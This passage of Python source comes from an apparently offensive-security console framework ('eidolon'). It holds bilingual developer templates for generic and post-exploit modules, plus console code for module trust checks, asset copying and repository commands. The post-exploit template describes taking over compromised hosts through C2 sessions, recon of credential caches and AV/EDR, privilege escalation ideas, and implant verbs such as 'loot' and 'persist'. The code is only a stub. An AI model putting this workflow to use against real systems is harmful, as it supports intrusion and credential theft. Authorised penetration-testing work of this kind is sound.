  [ ] outputs default to the operator's cwd
  [ ] every subprocess has a timeout; stderr reported through err()
"""

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what this converts / packages / reports"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "generic"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module

PAYLOAD_KIND = "none"

OPTIONS = {
    "input":  {"value": "", "required": True,  "desc": "input (file, string …)"},
    "output": {"value": "", "required": False, "desc": "write result here (empty = print)"},
}


def run(opts):
    src = str(opts.get("input", "")).strip()
    if not src:
        return err("set it: set input <value>")
    info(f"__NAME__: working on {src!r}")
    result = "TODO: transform here"

    out = str(opts.get("output", "")).strip()
    if out:
        with open(out, "w", encoding="utf-8") as f:
            f.write(str(result))
        ok(f"result → {out}")
    else:
        ok(f"result: {result}")
''',
        "fa": r'''"""
__NAME__ — ماژول GENERIC — راهنمای کامل صفر تا صد توسعه‌دهنده
=====================================================================

generic در اینجا یعنی چه
  GENERIC = نه حمله، نه پژوهش: انکودر/دیکودر، مبدل، بسته‌بند، گزارش‌ساز،
  ترنسفورمر پیلود (هر زبانی در <- هر چیزی بیرون)، چسب اتوماسیون. وقتی نه
  exploit است نه listener نه payload نه auxiliary — خانه‌اش همین‌جاست.

بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
               با `set کلید مقدار` پر می‌شوند؛ کلیدهای required قبل از
               اجرای run() خودکار کنترل می‌شوند.
  * run(opts): {کلیدی: مقدار} می‌گیرد؛ def ساده یا async def.
  قلاب‌های اختیاری: on_load() / stop() — مثل همه‌ی ماژول‌ها.

بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
  opts              {کلید: مقدار} — مقادیر حل‌شده‌ی گزینه‌ها
  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — نگهداری حالت کوچک
  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)

بخش ۳ — نوشتن ماژول generic از صفر، گام به گام
  ۱. هر ماژول یک مسئولیت تیز: تبدیل X به Y، بسته‌بندی Z، تولید گزارش R.
     ترکیب‌پذیری مهم‌تر از هوشمندی است — ماژول‌ها با خواندن حالت مشترک از
     EIDOLON_GLOBALS هم را صدا می‌زنند.
  ۲. OPTIONS را اعلام کن: `input` (لازم — فایل، رشته، هر چه ترنسفورمت
     می‌خورَد) و `output` (خالی = چاپ در کنسول). پیچ‌های دیگر (mode،
     سطح، زبان هدف …) طبق نیاز ابزار اضافه کن.
  ۳. پیاده‌سازی run(opts):
       - ورودی فقط از راهی که اپراتور داده خوانده شود (مسیر/رشته) — هرگز
         آدرس از خودت نساز، هرگز انبار موقت را لمس نکن؛
       - پیش‌فرض مسیر خروجی پوشه‌ی کاری اپراتور است (os.getcwd()) وقتی
         آرتیفکت می‌نویسی؛ مسیر نسبی نسبت به همان می‌ماند؛
       - ابزارهای subprocess (کامپایلر/انکودر) همیشه با timeout و stderr
         گرفته‌شده؛ شکست <- err(str(e)).
  ۴. خروجی قابل بازرسی نگه دار: یک خط خلاصه با ok()/info()؛ نتیجه‌ی کامل
     در `output` وقتی ست است. فرمت ماشینی بهتر از نثر است.
  ۵. (اختیاری) هویت مشورتی: RANK / TARGETS / REFERENCES.

بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
      new_module myconv generic ؛ trust myconv ؛ use myconv
      set input dump.bin ؛ run            <- نتیجه روی کنسول
      set output converted.txt ؛ run      <- نتیجه کنار اپراتور
  مثل همه‌جا: ابزارِ تبدیل پیش‌زمینه اجرا می‌شود؛ حلقه‌های بلند خودت را در
  thread بپیچ و در صورت نیاز `run` را job کن (`jobs` / `kill <id>`).

بخش ۵ — چک‌لیست پیش از اعلام «تمام»
  [ ] یک مسئولیت تیز؛ ترکیب‌پذیر از راه EIDOLON_GLOBALS
  [ ] ورودی فقط از مسیرهای اعلام‌شده در OPTIONS؛ بدون stage در tmp
  [ ] خروجی‌ها پیش‌فرض پوشه‌ی کاری اپراتور
  [ ] هر subprocess timeout دارد؛ stderr با err() گزارش می‌شود
"""

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what this converts / packages / reports"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "generic"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module

PAYLOAD_KIND = "none"

OPTIONS = {
    "input":  {"value": "", "required": True,  "desc": "input (file, string …)"},
    "output": {"value": "", "required": False, "desc": "write result here (empty = print)"},
}


def run(opts):
    src = str(opts.get("input", "")).strip()
    if not src:
        return err("set it: set input <value>")
    info(f"__NAME__: working on {src!r}")
    result = "TODO: transform here"

    out = str(opts.get("output", "")).strip()
    if out:
        with open(out, "w", encoding="utf-8") as f:
            f.write(str(result))
        ok(f"result → {out}")
    else:
        ok(f"result: {result}")
''',
    },
    "post-exploit": {
        "en": r'''"""
__NAME__ — POST-EXPLOIT — the complete zero-to-100 developer guide
===================================================================

POSITION IN THE CHAIN
  An exploit gets you IN; THIS module owns everything after. It REQUIRES
  initial access — declare how you hold the foothold (a wraith session, a
  listener channel, an agent id...) in OPTIONS, then do the two jobs:
  full recon, escalation, and an interactive shell channel.

PART 1 — THE CONTRACT (THREE names, one more than every other type)
  * OPTIONS    : same {"KEY": {"value", "required", "desc"}} page as every
                 module; required keys validated BEFORE run()/shell().
                 The natural option here is `session` (which foothold).
  * run(opts)  : PHASE 1 — recon / escalation through the foothold.
                 plain def or async def.
  * shell(opts): PHASE 2 — interactive takeover; invoked by the operator's
                 `shell` command while this module is selected. Works even
                 BEFORE run() — locate the foothold yourself.
  Both run() and shell(): def AND async def are first-class — the
  framework runs the event loop for you (foreground or as a job).
  Optional hooks: on_load() / stop() like every module.

PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run()/shell() (zero setup)
  opts              {KEY: value} — resolved option values
  EIDOLON_GLOBALS   shared global dict — persist small state
  EIDOLON_SHELL     the live console instance
  __eidolon_path__  absolute path of this file (resolve siblings from it)

PART 3 — WRITING A POST-EXPLOIT FROM ZERO: THE THREE MOVES
  MOVE 1 — FOOTHOLD (initial access is REQUIRED in this type).
      eidolon.wraith.sessions.default_registry() holds the sessions your
      exploits produced (`c2 sessions` lists them). Pick by explicit
      `session` option or the first active session (shown in the code):
          def _pick_session(opts):
              from eidolon.wraith import sessions as ws
              reg = ws.default_registry()
              sid = str(opts.get("session", "")).strip()
              if sid: return reg.find(sid)          # raises with a clear message
              pool = [s for s in reg.all() if s.status == "active"]
              return pool[0] if pool else None
      No active session -> err("break in first (`c2 sessions`)") — never
      invent a foothold.
  MOVE 2 — DIALECT
      The payload you built speaks a shell dialect YOU chose at build time
      (raw bash / cmd / PowerShell / any verb protocol). A session's
      interact IS that negotiated channel: calling sess.interact(sh) hands
      the console straight to the listener's shell. Keep zero assumptions:
      what `dir` means, how outputs are framed — all agreed between you
      and the implant.
  MOVE 3 — TAKEOVER (the interactive shell)
      Either delegate to the session channel (sess.interact) or keep the
      console in-module with:
          sh.enter_subshell(on_line=fn, completer=fn,      # FULL TAB COMPLETION
                            prompt_fn=fn, on_exit=fn)
      The completer enumerates the verbs WE agreed on (sysinfo / whoami /
      loot / persist / upgrade / back / exit — below).

PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
      new_module mypost post-exploit ; trust mypost
      (... exploit lands a session: c2 sessions shows sid ...)
      use mypost                        -> select the post-exploit module
      run                               -> PHASE 1 recon/escalation readout
      shell                             -> PHASE 2 takeover (module channel)
      back / exit                       -> console; channel stays live
  Recon ideas to implement: OS/kernel build, services, AV/EDR presence,
  credential caches, scheduled tasks, containers, lateral reachability.
  Escalation ideas: SUID/capabilities, token abuse, service misconfig,
  kernel bugs — the framework judges nothing.

PART 5 — SAFETY/HOUSE RULES
  * speak to the operator only via eidolon.utils (ok/err/info/warn).
  * every network op has an explicit timeout; errors via err(str(e)).
  * no eval/exec; artifacts 0o600; nothing in temp storage.

PART 6 — CHECKLIST BEFORE YOU CALL IT DONE
  [ ] refuses cleanly with no active session (err, never a traceback)
  [ ] `session` option resolves any sid prefix; default = first active
  [ ] shell() works before AND after run()
  [ ] tab completion lists the real verbs agreed with the implant
"""

import os

from eidolon.utils import ok, err, info

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: what foothold this deepens (recon / escalation)"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "post-exploit"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "ubuntu 22.04"), net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes


OPTIONS = {
    "session": {"value": "", "required": False,
                "desc": "wraith session to operate through (default: first active)"},
}

_CHANNEL = None             # set below: the negotiated shell dialect of the foothold


def _pick_session(opts):
    """MOVE 1 — locate the foothold (initial access is REQUIRED here)."""
    from eidolon.wraith import sessions as ws
    reg = ws.default_registry()
    sid = str(opts.get("session", "")).strip()
    if sid:
        return reg.find(sid)                      # raises with a clear message
    pool = [s for s in reg.all() if s.status == "active"]
    return pool[0] if pool else None


def run(opts):
    """PHASE 1 — recon / escalation through the foothold. Make me async."""
    global _CHANNEL
    sess = _pick_session(opts)
    if sess is None:
        return err("no active session — break in first (`c2 sessions`), or set session <prefix>")
    _CHANNEL = getattr(sess, "interact", None)
    ok("__NAME__: on %s@%s (%s %s) via %s…" % (sess.user, sess.host, sess.os, sess.arch, sess.sid[:8]))
    info("recon: OS/kernel · services · AV/EDR · creds · lateral reachability")
    info("escalate: SUID/caps · token abuse · service misconfig · kernel bugs")
    info("interactive takeover ready — type: shell")


def _complete(text, line):
    # MOVE 3 — FULL TAB COMPLETION over the verbs WE agreed on with the implant
    if not line.split():
        return [w for w in ("sysinfo", "whoami", "loot", "persist", "upgrade", "back", "exit")
                if w.startswith(text)]
    return []


def shell(opts):
    """PHASE 2 — `shell` command: the operator takes the negotiated channel."""
    sh = EIDOLON_SHELL
    sess = _pick_session(opts)                    # works even before run()
    if sess is None:
        return err("no active session — break in first (`c2 sessions`)")
    channel = getattr(sess, "interact", None)
    if callable(channel):
        channel(sh)                               # MOVE 2 — the listener's
        return                                    # dialect (raw bash/cmd/…)
    sh.enter_subshell(on_line=lambda line: info("channel: %r — wire your dialect here" % line),
                      completer=_complete,
                      prompt_fn=lambda: "%.4s post ❯ " % sess.sid,
                      on_exit=lambda: info("back to eidolon — channel stays live"))
''',
        "fa": r'''"""
__NAME__ — ماژول POST-EXPLOIT — راهنمای کامل صفر تا صد توسعه‌دهنده
===================================================================

جایگاه در زنجیره
  اکسپلویت «ورود» می‌دهد؛ «این ماژول» صاحب همه‌ی چیزهای بعد از ورود است.
  به دسترسی اولیه نیاز دارد — نحوه‌ی اتصال به نقطه‌ی نفوذ را در OPTIONS
  مشخص کن (یک سشن wraith، یک کانال لیستنر، شناسه‌ی agent …)، سپس دو کار:
  ریکون کامل، ارتقای دسترسی، و کانال شل تعاملی.

بخش ۱ — قرارداد (سه نام — یکی بیشتر از هر تایپ دیگر)
  * OPTIONS    : همان صفحه‌ی {"کلید": {"value", "required", "desc"}} همه‌ی
                 ماژول‌ها؛ کلیدهای required قبل از run()/shell() کنترل
                 می‌شوند. گزینه‌ی طبیعی اینجا `session` است (کدام فوهولد).
  * run(opts)  : فاز ۱ — ریکون / ارتقا از طریق فوهولد. def ساده یا async.
  * shell(opts): فاز ۲ — تصاحب تعاملی؛ با دستور `shell` اپراتور در حال
                 انتخاب این ماژول صدا زده می‌شود. حتی قبل از run() هم
                 کار می‌کند — فوهولد را خودت پیدا کن.
  برای run() و shell() هر دو: def و async def درجه‌یک‌اند — فریم‌ورک حلقه‌ی
  رویداد را خودش اجرا می‌کند (پیش‌زمینه یا به‌صورت job).
  قلاب‌های اختیاری: on_load() / stop() مثل همه‌ی ماژول‌ها.

بخش ۲ — فریم‌ورک داخل run()/shell() چه چیزهایی تزریق می‌کند (بدون تنظیم)
  opts              {کلید: مقدار} — مقادیر حل‌شده
  EIDOLON_GLOBALS   دیکشنری سراسری مشترک
  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول
  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)

بخش ۳ — نوشتن post-exploit از صفر: سه حرکت
  حرکت ۱ — فوهولد (دسترسی اولیه در این تایپ «اجباری» است).
      eidolon.wraith.sessions.default_registry() سشن‌هایی را دارد که
      اکسپلویت‌های تو ساخته‌اند (`c2 sessions` فهرستشان می‌کند). انتخاب با
      گزینه‌ی صریح `session` یا اولین سشن فعال (در کد پایین آمده):
          def _pick_session(opts):
              from eidolon.wraith import sessions as ws
              reg = ws.default_registry()
              sid = str(opts.get("session", "")).strip()
              if sid: return reg.find(sid)          # خطای شفاف می‌دهد
              pool = [s for s in reg.all() if s.status == "active"]
              return pool[0] if pool else None
      سشن فعال نیست <- err("اول نفوذ کن (`c2 sessions`)") — هرگز فوهولد
      از خودت نیساز.
  حرکت ۲ — لهجه
      پیلودی که ساختی لهجه‌ی شلی می‌زند که «تو» در زمانِ ساختن انتخاب
      کردی (raw bash / cmd / PowerShell / هر پروتکل فعلی). interact سشن
      همان کانال توافقی است: صدا زدن sess.interact(sh) کنسول را مستقیم
      به شل لیستنر می‌سپارد. صفر فرض: یعنی `dir` چه معنایی دارد، خروجی‌ها
      چطور قالب‌بندی می‌شوند — همه توافق تو و ایمپلنت است.
  حرکت ۳ — تصاحب (شل تعاملی)
      یا کانال سشن را واگذار کن (sess.interact) یا کنسول را داخل ماژول
      نگه دار با:
          sh.enter_subshell(on_line=fn, completer=fn,      # تب‌کامپلیت کامل
                            prompt_fn=fn, on_exit=fn)
      کامپلیتر فعل‌هایی را که «ما» توافق کردیم بر‌می‌شمارد (sysinfo /
      whoami / loot / persist / upgrade / back / exit — پایین).

بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
      new_module mypost post-exploit ؛ trust mypost
      (... اکسپلویت سشن می‌اندازد: c2 sessions نشان می‌دهد sid ...)
      use mypost                        <- انتخاب ماژولِ post-exploit
      run                               <- فاز ۱ خروجی ریکون/ارتقا
      shell                             <- فاز ۲ تصاحب (کانال ماژول)
      back / exit                       <- کنسول؛ کانال زنده می‌ماند
  ایده‌های ریکون برای پیاده‌سازی: نسخه‌ی OS/کرنل، سرویس‌ها، حضور AV/EDR،
  کش اعتبارنامه‌ها، تسک‌های زمان‌بندی‌شده، کانتینرها، دسترس‌پذیری جانبی.
  ایده‌های ارتقا: SUID/capabilities، سوءاستفاده از token، پیکربندی غلط
  سرویس، باگ کرنل — فریم‌ورک داوری نمی‌کند.

بخش ۵ — قوانین ایمنی/خانه
  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn).
  * هر عملیات شبکه timeout صریح دارد؛ خطا با err(str(e)).
  * eval/exec ممنوع؛ آرتیفکت 0o600؛ هیچ چیز در انبار موقت.

بخش ۶ — چک‌لیست پیش از اعلام «تمام»
  [ ] بدون سشن فعال با err تمیز رد می‌شود (هرگز traceback)
  [ ] گزینه‌ی `session` هر پیشوند sid را حل می‌کند؛ پیش‌فرض = اولین فعال
  [ ] shell() قبل و بعد از run() کار می‌کند
  [ ] تب‌کامپلیت فعل‌های واقعیِ توافق‌شده با ایمپلنت را فهرست می‌کند
"""

import os

from eidolon.utils import ok, err, info

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: عمق بخشیدن به کدام فوهولد (ریکون / ارتقای دسترسی)"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "post-exploit"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # مرتبه‌ی کیفیت: excellent > great > good > normal > average > low > manual
TARGETS     = []            # اعتبار روی چه: ("linux/x86_64", "ubuntu 22.04")، بره‌ها
REFERENCES  = []            # ارجاع‌ها: CVE، ورایت‌آپ، یادداشت توسعه‌دهنده


OPTIONS = {
    "session": {"value": "", "required": False,
                "desc": "سشن wraith برای کار (پیش‌فرض: اولین سشن فعال)"},
}

_CHANNEL = None             # در ادامه تنظیم می‌شود: لهجه‌ی شلِ توافقیِ فوهولد


def _pick_session(opts):
    """حرکت 1 — پیدا کردن فوهولد (دسترسی اولیه در اینجا اجباری است)."""
    from eidolon.wraith import sessions as ws
    reg = ws.default_registry()
    sid = str(opts.get("session", "")).strip()
    if sid:
        return reg.find(sid)                      # خطای شفاف می‌دهد
    pool = [s for s in reg.all() if s.status == "active"]
    return pool[0] if pool else None


def run(opts):
    """فاز 1 — ریکون / ارتقا از طریق فوهولد. async هم مجاز است."""
    global _CHANNEL
    sess = _pick_session(opts)
    if sess is None:
        return err("هیچ سشن فعالی نیست — اول نفوذ کن (`c2 sessions`) یا: set session <prefix>")
    _CHANNEL = getattr(sess, "interact", None)
    ok("__NAME__: روی %s@%s (%s %s) از طریق %s…" % (sess.user, sess.host, sess.os, sess.arch, sess.sid[:8]))
    info("ریکون: OS/کرنل · سرویس‌ها · AV/EDR · اعتبارنامه‌ها · دسترس‌پذیری جانبی")
    info("ارتقا: SUID/caps · سوءاستفاده از token · پیکربندی غلط سرویس · باگ کرنل")
    info("تصاحب تعاملی آماده است — بزن: shell")


def _complete(text, line):
    # حرکت 3 — تَب‌کامپلیت کامل روی فعل‌هایی که با ایمپلنت توافق کرده‌ایم
    if not line.split():
        return [w for w in ("sysinfo", "whoami", "loot", "persist", "upgrade", "back", "exit")
                if w.startswith(text)]
    return []


def shell(opts):
    """فاز 2 — دستور `shell`: اپراتور کانال توافقی را می‌گیرد."""
    sh = EIDOLON_SHELL
    sess = _pick_session(opts)                    # حتی قبل از run() هم کار می‌کند
    if sess is None:
        return err("هیچ سشن فعالی نیست — اول نفوذ کن (`c2 sessions`)")
    channel = getattr(sess, "interact", None)
    if callable(channel):
        channel(sh)                               # حرکت 2 — لهجه‌ی لیسنر
        return                                    # (raw bash/cmd/…)
    sh.enter_subshell(on_line=lambda line: info("کانال: %r — لهجه‌ی خودت را اینجا وصل کن" % line),
                      completer=_complete,
                      prompt_fn=lambda: "%.4s post ❯ " % sess.sid,
                      on_exit=lambda: info("برگشت به eidolon — کانال هنوز زنده است"))
''',
    },
}
def _type_label(mod) -> str:
    t = _module_type(mod)
    return c(t, _TYPE_COLOR.get(t, "white"))


def _declared_assets(py_file):
    """Module-level ASSETS declaration, read via ast (never exec — TOFU).
    Returns the declared list of strings, [] when nothing is declared,
    or None when ASSETS exists but is not a list of strings."""
    try:
        tree = ast.parse(Path(py_file).read_text(encoding="utf-8", errors="replace"))
    except (OSError, SyntaxError, ValueError):
        return []
    for node in tree.body:
        if isinstance(node, ast.Assign):
            names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            value = node.value
        elif isinstance(node, ast.AnnAssign) and node.value is not None:
            names = [node.target.id] if isinstance(node.target, ast.Name) else []
            value = node.value
        else:
            continue
        if "ASSETS" not in names:
            continue
        if isinstance(value, ast.Constant) and isinstance(value.value, str):
            return [value.value]
        if isinstance(value, (ast.Tuple, ast.List, ast.Set)):
            return [e.value for e in value.elts
                    if isinstance(e, ast.Constant) and isinstance(e.value, str)]
        return None
    return []


def _ship_declared_assets(fsrc, fdest_base, key):
    """Copy exactly the assets this module declares (files or directories,
    relative to the module file) next to its installed copy. Declared
    directories skip __pycache__, hidden entries and .pyc."""
    declared = _declared_assets(fsrc)
    if declared is None:
        warn(f"'{key}': module-level ASSETS is not a list of strings — ignored")
        return []
    dests = []
    for rel in declared:
        parts = ()
        if isinstance(rel, str):
            parts = tuple(p for p in rel.replace("\\", "/").split("/")
                          if p not in ("", "."))
        if (not parts or rel.startswith(("/", "~")) or ".." in parts
                or (len(rel) > 1 and rel[1] == ":")):
            warn(f"'{key}': invalid entry in ASSETS (skipped): {rel!r}")
            continue
        asset_src = fsrc.parent.joinpath(*parts)
        if not asset_src.exists():
            warn(f"'{key}': declared asset missing (skipped): {rel}")
            continue
        if asset_src.is_file():
            fdest = fdest_base.joinpath(*parts)
            fdest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(asset_src, fdest)
            dests.append(fdest)
            continue
        for child in sorted(asset_src.rglob("*")):
            cparts = child.relative_to(fsrc.parent).parts
            if (not child.is_file() or "__pycache__" in cparts
                    or any(p.startswith(".") for p in cparts)
                    or child.name.endswith(".pyc")):
                continue
            fdest = fdest_base.joinpath(*cparts)
            fdest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(child, fdest)
            dests.append(fdest)
    return dests


class Eidolon(cmd.Cmd):
    intro = ""
    use_rawinput = True

    def __init__(self):
        super().__init__()
        os.makedirs(MODULES_DIR, exist_ok=True)
        self.db = EidolonDB(DB_PATH)
        self.repo_mgr = RepositoryManager()
        self.trust_mgr = TrustManager(modules_dir=MODULES_DIR)
        self.globals = self.db.get_globals()
        self.modules = {}
        self._module_mtimes = {}
        self._untrusted = {}   # {module_key: status} — untrusted/modified/missing files
        self.current = None
        self.current_name = None
        self.current_options = None
        self._wraith_listener = None
        self._wraith_lock = threading.RLock()
        self.jobs = JobManager()

        self.session_t0 = time.time()
        self.operator_name = "root"
        self.operator_team = "eidolon"
        self._subshell_active = False
        self._subshell_handler = None
        self._subshell_completer = None
        self._subshell_prompt_fn = None
        self._subshell_on_exit = None
        self._subshell_session_id = None
        self._update_prompt()

    def preloop(self):
        print_splash()
        _cleanup_legacy_scaffolds(MODULES_DIR)
        # Clean up trust entries whose files were deleted
        try:
            purged = self.trust_mgr.purge_orphans()
            if purged:
                spectral(f"purged {len(purged)} orphan trust entr{'y' if len(purged)==1 else 'ies'}")
        except Exception as e:
            warn(f"trust purge failed: {e}")

        self.load_modules()
        print()
        spectral(f"welcome back, {C.BOLD}{self.operator_name}{C.RESET}")
        spectral(f"workspace : {C.CYAN}{WORKSPACE_DIR}{C.RESET}")
        spectral(f"modules   : {C.GREEN}{len(self.modules)}{C.RESET} loaded"
                 + (f" · {C.YELLOW}{len(self._untrusted)} untrusted{C.RESET}" if self._untrusted else ""))
        if self._untrusted:
            warn(f"{len(self._untrusted)} module(s) blocked by TOFU. run 'trusted' to inspect.")
        spectral(f"type {C.CYAN}help{C.RESET} for commands.\n")

    def postcmd(self, stop, line):
        self._update_prompt()
        return stop

    def emptyline(self): return

    def default(self, line):
        token = line.split()[0] if line.strip() else ""
        err(f"unknown command: {C.BOLD}{token}{C.RESET}")

    def _update_prompt(self):
        if self._subshell_active and callable(self._subshell_prompt_fn):
            try:
                self.prompt = rl_prompt_safe(self._subshell_prompt_fn())
                return
            except Exception: pass

        name_part = f"{C.CYAN}{self.operator_name}{C.GRAY}@{C.CYAN}{self.operator_team}{C.RESET}"
        ctx = f"{C.PINK}{self.current_name}{C.RESET}" if self.current_name else f"{C.GRAY}idle{C.RESET}"
        up = _uptime_str(self.session_t0)

        line1 = f"{C.PURPLE}╭─({name_part}{C.PURPLE})─[{ctx}{C.PURPLE}]─{C.SHADOW}[{up}]{C.PURPLE}"
        line2 = f"{C.PURPLE}╰─{C.PINK}❯{C.RESET} "
        self.prompt = f"\n{rl_prompt_safe(line1)}\n{rl_prompt_safe(line2)}"

    # ═════════════════════════════════════════════════════════
    # MODULE LOADING WITH TOFU GATE
    # ═════════════════════════════════════════════════════════
    def load_modules(self):
        self.modules = {}
        self._module_mtimes = {}
        self._untrusted = {}
        t0 = time.time()
        failed = 0
        untrusted = 0
        seen_names = set()

        for path, rel in iter_module_files(MODULES_DIR):
            name = rel[:-3]
            if name in seen_names:
                warn(f"duplicate module '{name}' — skipped")
                failed += 1
                continue
            seen_names.add(name)

            # ── TOFU gate ──
            trusted, status = self.trust_mgr.is_trusted(name, path)
            if not trusted:
                self._untrusted[name] = status
                untrusted += 1
                continue

            mod, error = load_module_from_path(path, self.globals, self)
            if error:
                failed += 1
                err(f"failed to load '{name}': {error}")
                continue

            if not hasattr(mod, "run"):
                warn(f"module '{name}' has no run(opts) — skipped")
                failed += 1
                continue
            if not hasattr(mod, "NAME"): mod.NAME = name

            self.modules[name] = mod
            try: self._module_mtimes[name] = os.path.getmtime(path)
            except OSError: pass

            if hasattr(mod, "on_load"):
                try: mod.on_load()
                except Exception as e: warn(f"{name}.on_load() failed: {e}")

        dt = (time.time() - t0) * 1000
        tail = f" · {failed} failed" if failed else ""
        if untrusted:
            tail += f" · {C.YELLOW}{untrusted} untrusted{C.RESET}"
        spectral(f"{len(self.modules)} module(s) loaded in {dt:.1f} ms{tail}")

    def _resolve(self, name):
        name = name.strip()
        known = list(self.modules.keys()) + list(self._untrusted.keys())
        if name in known: return name
        matches = [k for k in known if name in k]
        return matches[0] if len(matches) == 1 else None

    def _is_module_installed(self, target_name):
        target_clean = target_name.replace("-", "_")
        known = list(self.modules.keys()) + list(self._untrusted.keys())
        for existing_name in known:
            existing_base = os.path.basename(existing_name).replace("-", "_")
            if existing_base == target_clean:
                return existing_name
        return None

    def _auto_session_target(self):
        opts = self.current_options or {}
        for key in ("target", "rhost", "rhosts", "host", "hostname", "url", "uri"):
            if key in opts:
                v = opts[key].get("value")
                if v not in (None, "", False): return str(v)
        return ""

    def enter_subshell(self, handler=None, completer=None, prompt_fn=None,
                        on_exit=None, on_line=None):
        if handler is None:
            handler = on_line
        elif on_line is not None:
            raise TypeError("pass handler or on_line, not both")
        self._subshell_active = True
        self._subshell_handler = handler
        self._subshell_completer = completer
        self._subshell_prompt_fn = prompt_fn
        self._subshell_on_exit = on_exit
        if (self._subshell_session_id is None and self.current is not None
                and _module_type(self.current) == MODULE_TYPE_EXPLOIT):
            sid = self.db.add_session(
                self.current_name, self._auto_session_target(),
                _module_vulns(self.current), _module_cvss(self.current)
            )
            self._subshell_session_id = sid
            spectral(f"session {C.PINK}#{sid}{C.RESET} opened")
        self._update_prompt()

    def exit_subshell(self):
        on_exit = self._subshell_on_exit
        if self._subshell_session_id is not None:
            self.db.close_session(self._subshell_session_id)
            self._subshell_session_id = None
        self._subshell_active = False
        if callable(on_exit):
            try: on_exit()
            except Exception as e: warn(f"subshell cleanup: {e}")
        self._update_prompt()

    def onecmd(self, line):
        if self._subshell_active:
            token = line.strip().split(maxsplit=1)[0] if line.strip() else ""
            if token in ("back", "exit", "quit", "EOF"): return super().onecmd(line)
            if callable(self._subshell_handler):
                try: self._subshell_handler(line)
                except Exception as e: err(f"subshell error: {e}")
                return False
        return super().onecmd(line)

    # ═════════════════════════════════════════════════════════
    # REPO COMMANDS
    # ═════════════════════════════════════════════════════════
    def do_repo(self, arg):
        """repo [list|add|remove|enable|disable|priority|sync|search|list-modules|stats|check|install|upgrade|update-all|pack|source|info]"""
        args = arg.strip().split()
        if not args:
            return self.do_repo("list")

        cmd = args[0].lower()

        if cmd in ("list", "remotes"):
            remotes = self.repo_mgr.remotes
            if not remotes:
                return warn("No remotes configured.")
            rows = []
            for r in remotes:
                status = (f"{C.GREEN}Enabled{C.RESET}" if r.get("enabled", True)
                          else f"{C.RED}Disabled{C.RESET}")
                rows.append([str(r.get("priority", 10)), status, r["url"]])
            print_table(["Priority", "Status", "Remote URL"], rows, title="CONFIGURED REMOTES")
            return

        if cmd == "add":
            validate = not any(a in ("--no-validate", "-n") for a in args)
            urls = [a for a in args[1:] if not a.startswith("-")]
            if not urls:
                return err("usage: repo add <url> [--no-validate]")
            url = urls[0]
            success, reason = self.repo_mgr.add_remote(url, validate=validate)
            if success:
                ok(f"Added remote: {C.CYAN}{url}{C.RESET}")
                warn("Remote modules will be UNTRUSTED after install — verify before trusting.")
            elif "already exists" in reason:
                warn(reason)
            else:
                err(f"Failed to add: {reason}")
            return

        if cmd == "remove" and len(args) > 1:
            if self.repo_mgr.remove_remote(args[1]):
                ok(f"Removed remote: {args[1]}")
            else:
                warn("Remote not found.")
            return

        if cmd == "enable" and len(args) > 1:
            ok("Remote enabled.") if self.repo_mgr.toggle_remote(args[1], True) else err("Remote not found.")
            return

        if cmd == "disable" and len(args) > 1:
            ok("Remote disabled.") if self.repo_mgr.toggle_remote(args[1], False) else err("Remote not found.")
            return

        if cmd == "priority" and len(args) > 2:
            try:
                prio = int(args[2])
            except ValueError:
                return err("Priority must be an integer.")
            ok(f"Remote priority set to {prio}.") if self.repo_mgr.set_priority(args[1], prio) else err("Remote not found.")
            return

        if cmd == "sync":
            spectral("Syncing metadata from enabled remotes…")
            count = self.repo_mgr.sync_json(force_refresh=True)
            ok(f"Cached metadata from {count} remote(s).")
            return

        if cmd in ("list-modules", "avail", "search"):
            modules = self.repo_mgr.get_all_modules()
            if not modules:
                return warn("No modules found in any remote.")
            if cmd == "search":
                if len(args) < 2:
                    return err("usage: repo search <keyword>")
                kw = args[1].lower()
                filtered = {
                    k: v for k, v in modules.items()
